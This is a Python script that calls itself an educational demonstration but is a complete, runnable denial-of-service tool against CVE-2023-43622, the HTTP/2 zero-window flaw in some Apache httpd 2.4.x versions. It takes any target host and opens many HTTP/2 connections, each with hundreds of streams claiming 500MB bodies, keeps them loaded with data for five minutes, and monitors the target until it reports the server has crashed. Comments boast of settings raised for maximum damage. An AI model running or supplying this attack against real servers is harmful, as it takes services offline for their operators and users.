#!/usr/bin/env python3
"""
Simplified CVE-2023-43622 Attack - HTTP/2 Window Size 0 DoS
Educational demonstration of Apache httpd 2.4.55-2.4.57 vulnerability
"""

import socket
import h2.connection
import h2.config
import h2.settings
import time
import threading
import argparse

def create_attack_connection(target, port, connection_id):
    """Create a single HTTP/2 connection exploiting CVE-2023-43622"""
    try:
        # Connect to target
        sock = socket.create_connection((target, port), timeout=10)
        
        # Create HTTP/2 connection
        config = h2.config.H2Configuration(client_side=True)
        conn = h2.connection.H2Connection(config=config)
        
        # Initialize connection
        conn.initiate_connection()
        
        # CVE-2023-43622: Set window size to 0
        conn.update_settings({h2.settings.SettingCodes.INITIAL_WINDOW_SIZE: 0})
        
        # Send initial data
        sock.sendall(conn.data_to_send())
        
        # Wait for server settings
        data = sock.recv(65536)
        if data:
            conn.receive_data(data)
            sock.sendall(conn.data_to_send())
        
        print(f"[+] Connection {connection_id}: HTTP/2 established with window size 0")
        
        # Create MASSIVE number of streams to completely exhaust server
        max_streams = 200  # Increased from 50 to 200 streams per connection
        for stream_id in range(1, max_streams * 2, 2):  # Odd stream IDs for client
            try:
                # HUGE POST request headers to maximize memory consumption
                content_size = 500000000  # 500MB per stream (10x increase)
                headers = [
                    (':method', 'POST'),
                    (':path', f'/crash/connection_{connection_id}/stream_{stream_id}'),
                    (':authority', target),
                    (':scheme', 'http'),
                    ('content-type', 'application/octet-stream'),
                    ('content-length', str(content_size)),
                    ('user-agent', f'CVE-2023-43622-DoS-Agent-{connection_id}-{stream_id}'),
                    ('x-attack-payload', 'memory-exhaustion'),
                ]
                
                # Send headers
                conn.send_headers(stream_id, headers, end_stream=False)
                
                # Send MULTIPLE data chunks immediately to fill server buffers
                for chunk_num in range(8):  # Send 8 x 16KB = 128KB immediately
                    data_chunk = b'X' * 16384
                    conn.send_data(stream_id, data_chunk, end_stream=False)
                
                # Send all data to server at once
                to_send = conn.data_to_send()
                if to_send:
                    sock.sendall(to_send)
                
                if stream_id % 10 == 1:  # Print progress every 10 streams
                    total_memory = (stream_id // 2 + 1) * content_size / (1024**3)
                    print(f"[+] Connection {connection_id}: {stream_id//2+1} streams created ({total_memory:.1f}GB claimed)")
                
                # Minimal delay for rapid stream creation
                time.sleep(0.01)  # Reduced from 0.1s to 0.01s
                
            except Exception as e:
                print(f"[!] Connection {connection_id}: Stream creation failed at {stream_id}: {e}")
                break
        
        # Keep connection alive and continue sending data
        start_time = time.time()
        while time.time() - start_time < 300:  # 5 minutes
            try:
                # Try to read server data (should be minimal due to window size 0)
                sock.settimeout(1.0)
                try:
                    data = sock.recv(1024)
                    if data:
                        conn.receive_data(data)
                        sock.sendall(conn.data_to_send())
                except socket.timeout:
                    pass
                
                # Send AGGRESSIVE periodic data to maintain memory pressure
                if int(time.time()) % 5 == 0:  # Every 5 seconds (more frequent)
                    # Send data to MANY streams to maximize memory consumption
                    for stream_id in range(1, 101, 2):  # First 50 streams (increased from 10)
                        try:
                            # Send larger chunks more frequently
                            for _ in range(4):  # 4 chunks per stream
                                data_chunk = b'Y' * 16384  # 16KB chunk (doubled size)
                                conn.send_data(stream_id, data_chunk, end_stream=False)
                        except:
                            pass
                    
                    to_send = conn.data_to_send()
                    if to_send:
                        sock.sendall(to_send)
                    
                    elapsed = time.time() - start_time
                    data_sent_mb = 50 * 4 * 16384 / (1024*1024)  # ~3.2MB per cycle
                    print(f"[+] Connection {connection_id}: Alive {elapsed:.0f}s, sent +{data_sent_mb:.1f}MB, CRUSHING SERVER")
                
                time.sleep(1)
                
            except Exception as e:
                print(f"[!] Connection {connection_id}: Error: {e}")
                break
        
        print(f"[!] Connection {connection_id}: Finished")
        
    except Exception as e:
        print(f"[!] Connection {connection_id}: Failed to establish: {e}")
    finally:
        try:
            sock.close()
        except:
            pass

def monitor_server_health(target, port):
    """Monitor server responsiveness and detect complete crashes"""
    consecutive_failures = 0
    
    while True:
        try:
            start = time.time()
            sock = socket.create_connection((target, port), timeout=3)  # Shorter timeout
            sock.send(b"GET /health.html HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
            response = sock.recv(1024)
            sock.close()
            response_time = time.time() - start
            
            if response_time > 5.0:
                print(f"[!] CRITICAL SLOWDOWN: {response_time:.2f}s - SERVER NEARLY CRASHED!")
                consecutive_failures += 1
            elif response_time > 2.0:
                print(f"[!] SEVERE IMPACT: {response_time:.2f}s - CVE-2023-43622 working!")
                consecutive_failures += 1
            else:
                print(f"[+] Server responsive: {response_time:.2f}s")
                consecutive_failures = 0
                
        except socket.timeout:
            consecutive_failures += 1
            print(f"[!] TIMEOUT #{consecutive_failures}: Server not responding - CVE-2023-43622 DoS!")
            
        except ConnectionRefusedError:
            consecutive_failures += 1
            print(f"[!] CONNECTION REFUSED #{consecutive_failures}: SERVER CRASHED! DoS ACHIEVED!")
            
        except Exception as e:
            consecutive_failures += 1
            print(f"[!] SERVER ERROR #{consecutive_failures}: {e} - DoS in progress!")
        
        # Check for complete server crash
        if consecutive_failures >= 3:
            print(f"[!!!] COMPLETE SERVER CRASH DETECTED! {consecutive_failures} consecutive failures!")
            print(f"[!!!] CVE-2023-43622 DENIAL OF SERVICE SUCCESSFULLY ACHIEVED!")
        
        time.sleep(10)  # Check more frequently

def main():
    parser = argparse.ArgumentParser(description="Simplified CVE-2023-43622 Attack")
    parser.add_argument("target", help="Target hostname")
    parser.add_argument("--port", type=int, default=80, help="Port (default: 80)")
    parser.add_argument("--connections", type=int, default=100, help="Connections (default: 100)")
    parser.add_argument("--auto", action="store_true", help="Auto mode")
    
    args = parser.parse_args()
    
    print("CVE-2023-43622 Simplified Attack")
    print("=" * 40)
    print(f"Target: {args.target}:{args.port}")
    print(f"Connections: {args.connections}")
    print("Method: HTTP/2 window size 0 memory exhaustion")
    
    if not args.auto:
        input("Press Enter to start attack...")
    
    # Start monitoring
    monitor_thread = threading.Thread(target=monitor_server_health, args=(args.target, args.port), daemon=True)
    monitor_thread.start()
    
    # Start attack connections with RAPID deployment
    threads = []
    
    # Deploy connections in batches for maximum impact
    batch_size = 20
    for batch in range(0, args.connections, batch_size):
        batch_threads = []
        print(f"[*] Deploying batch {batch//batch_size + 1}: connections {batch}-{min(batch+batch_size-1, args.connections-1)}")
        
        # Deploy batch rapidly
        for i in range(batch, min(batch + batch_size, args.connections)):
            thread = threading.Thread(target=create_attack_connection, args=(args.target, args.port, i), daemon=True)
            thread.start()
            threads.append(thread)
            batch_threads.append(thread)
            time.sleep(0.05)  # Very rapid deployment - 0.05s between connections
        
        # Brief pause between batches to avoid overwhelming our own system
        if batch + batch_size < args.connections:
            print(f"[*] Batch deployed, pausing 2s before next batch...")
            time.sleep(2)
    
    print(f"[*] Started {len(threads)} attack connections")
    
    # Wait for threads
    for thread in threads:
        thread.join()
    
    print("[*] Attack completed")

if __name__ == "__main__":
    main()